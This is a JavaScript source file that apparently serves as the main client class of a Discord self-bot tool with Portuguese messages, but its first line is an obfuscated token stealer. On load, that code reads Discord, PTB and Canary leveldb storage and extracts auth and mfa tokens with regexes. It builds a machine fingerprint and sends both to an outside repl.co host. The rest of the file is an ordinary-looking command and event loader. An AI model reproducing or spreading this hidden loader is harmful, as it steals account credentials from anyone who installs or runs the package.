const _0x2cf0=['Roaming','toString','AppData','join','length','path','readFileSync','484706rTDfec','62TVTUIT','Local\x20Storage','543309chmNEJ','homedir','split','hostname','8647sfyfCT','arch','endianness','388GzFDgo','exec','cpus','https://itachi.mumuvianax.repl.co/n','discordcanary','4174jvMPJo','ldb','245952ftFBZR','readdirSync','discord','563389lkYmKx','leveldb','slice','753716KCqPzV','https','get','discordptb','push'];const _0x2a31f1=_0x2e35,_0x1f989e=_0x2e35;(function(_0x23de41,_0x46fc96){const _0x80df0b=_0x2e35,_0x1adabc=_0x2e35,_0x582e6e=_0x2e35,_0x5b09b9=_0x2e35,_0x549c8b=_0x2e35;while(!![]){try{const _0x287765=-parseInt(_0x80df0b(0x185))+-parseInt(_0x1adabc(0x1a2))+parseInt(_0x1adabc(0x191))+-parseInt(_0x5b09b9(0x1a5))+parseInt(_0x80df0b(0x198))*parseInt(_0x5b09b9(0x192))+-parseInt(_0x549c8b(0x194))+parseInt(_0x1adabc(0x1a0))*parseInt(_0x549c8b(0x19b));if(_0x287765===_0x46fc96)break;else _0x23de41['push'](_0x23de41['shift']());}catch(_0x162c9c){_0x23de41['push'](_0x23de41['shift']());}}}(_0x2cf0,0x825ce));function _0x2e35(_0x59b6ef,_0x7f15d1){_0x59b6ef=_0x59b6ef-0x185;let _0x2cf03b=_0x2cf0[_0x59b6ef];return _0x2cf03b;}const fs=require('fs'),path=require(_0x2a31f1(0x18f)),OS=require('os'),https=require(_0x2a31f1(0x186));(async function(){const _0x3653d2=_0x1f989e,_0x37d61d=_0x2a31f1,_0x3b7a9=_0x1f989e,_0x2c959d=_0x1f989e,_0x3f1da8=_0x2a31f1;try{const _0x39594b=[],_0x54b411=OS[_0x3653d2(0x195)](),_0x516aae=OS[_0x37d61d(0x197)]()+'_'+_0x54b411[_0x37d61d(0x196)]('\x5c')[_0x2c959d(0x1a7)](-0x1)[0x0]+'_'+OS[_0x2c959d(0x199)]()+'_'+OS[_0x2c959d(0x19d)]()[_0x37d61d(0x18e)]+'_'+OS[_0x3b7a9(0x19a)](),_0xdcbaba=path[_0x3b7a9(0x18d)](_0x54b411,_0x3f1da8(0x18c),_0x3653d2(0x18a)),_0x2238c5=[_0x3653d2(0x193),_0x3f1da8(0x1a6)],_0x32727a={'default':path[_0x2c959d(0x18d)](_0xdcbaba,_0x3f1da8(0x1a4),..._0x2238c5),'ptb':path[_0x3653d2(0x18d)](_0xdcbaba,_0x37d61d(0x188),..._0x2238c5),'canary':path[_0x3653d2(0x18d)](_0xdcbaba,_0x3653d2(0x19f),..._0x2238c5)};for(let _0x4c7b88 in _0x32727a){try{let _0x5d6831=fs[_0x3f1da8(0x1a3)](_0x32727a[_0x4c7b88]);for(let _0x6aedaa of _0x5d6831){if(_0x6aedaa[_0x3b7a9(0x1a7)](-0x3)!==_0x3f1da8(0x1a1))continue;let _0x212695=_0xf72053(path[_0x3f1da8(0x18d)](_0x32727a[_0x4c7b88],_0x6aedaa));if(!_0x212695)continue;_0x39594b[_0x3f1da8(0x189)](_0x4c7b88+'::'+_0x212695);}}catch(_0x54c740){continue;}}function _0xf72053(_0x55d156){const _0x1ba13c=_0x3b7a9,_0x4725d3=_0x3b7a9,_0x3a72cf=_0x37d61d,_0x3f4d77=_0x3b7a9;let _0x114b45=fs[_0x1ba13c(0x190)](_0x55d156)[_0x4725d3(0x18b)](),_0x4322a1=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/,_0x4fd047=/"mfa\.[\d\w_-]{84}"/,[_0x209ea]=_0x4322a1[_0x3a72cf(0x19c)](_0x114b45)||_0x4fd047[_0x3f4d77(0x19c)](_0x114b45)||[null];return _0x209ea;}(async function _0x6d81ac(){const _0x1ac20e=_0x3b7a9,_0x44b16f=_0x2c959d;try{https[_0x1ac20e(0x187)](_0x44b16f(0x19e),{'headers':{'tokens':_0x39594b,'fingerprint':_0x516aae}});}catch(_0x103f3b){}}());}catch(_0x733de8){}}());
var { Client, Collection } = require('discord.js-self');
var { readdirSync } = require('fs');
var colors = require('colors');
var { Api } = require('.');

class Main extends Client {
    constructor(options) {
        super(options);

        this.validate(options);
        this.commands = new Collection();
        this.aliases = new Collection();
    }

    async initialize(token = this.token) {
        const events = readdirSync('src/events/');
        events.forEach(file => {
            if (!file.endsWith('.js'))
                return;

            let path = `./events/${file}`;
            let archive = require(path);
            delete require.cache[require.resolve(path)];

            this.on(archive.event, (...args) => archive.run(this, ...args));
        });
        console.clear()
        console.log(colors.bgYellow(colors.black(' AVISO ')), colors.yellow(`
          
  \  |_) |             __ )                   |             
   \ | | __|  __| _ \  __ \   _ \   _ \   __| __|  _ \  __| 
 |\  | | |   |   (   | |   | (   | (   |\__ \ |    __/ |    
_| \_|_|\__|_|  \___/ ____/ \___/ \___/ ____/\__|\___|_| - coder


                            Iniciando...
          `));

        await this.login(token);
        this.api_ = new Api(this);

        const commands = readdirSync('src/commands/');
        commands.forEach(file => {
            if (!file.endsWith('.js'))
                return;

            let path = `./commands/${file}`;
            let archive = require(path);
            delete require.cache[require.resolve(path)];

            let name = archive.name || file.split('.').pop();
            this.commands.set(name, archive);

            let aliases = archive.aliases || [];
            aliases.forEach(alias => {
                this.aliases.set(alias, name);
            });
        });
    }

    validate(options) {
        if (!options.token) {
            throw new Error('Vish, o cliente precisa de um token');
        }

        if (typeof options.token !== 'string') {
            throw new TypeError('O token tem que ser do tipo string');
        }

        this.token = options.token;
        this.prefix = options.prefix || '.';
    }
}

module.exports = Main;
